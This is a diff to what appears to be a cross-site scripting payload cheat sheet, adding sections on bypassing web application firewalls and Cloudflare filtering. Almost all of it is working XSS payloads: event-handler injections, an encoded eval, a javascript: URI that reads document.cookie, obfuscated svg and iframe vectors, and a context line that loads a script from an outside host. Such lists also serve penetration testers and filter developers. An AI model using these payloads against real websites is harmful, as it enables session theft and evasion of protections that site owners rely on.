@@ -179,5 +179,26 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&{()}
   <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>```
-## 
+## Bypassing FireWalls
+
+```html
+"><input/onauxclick="[1].map(prompt)">
+<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
+'"--><Body onbeforescriptexecute="[1].map(confirm)">
+'-prompt.call(window, 'xss')-'
+'-alert.call(window, 'xss')-'
+<\/script><script>alert('XSS')<\/script>
+aaa"bbb'ccc<svg onload=alert('XSS')>eee
+javascript://%0a%0dalert(document.cookie)
+<--`<img/src=`%20onerror=confirm``>%20--!>
+<svg </onload ="1> (_=alert,_(1337)) "">
+<details/open/ontoggle=window.alert`xss`>
+ ```
+ 
+ ## CloudFlare Bypass
+ ```html
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+ ```
 
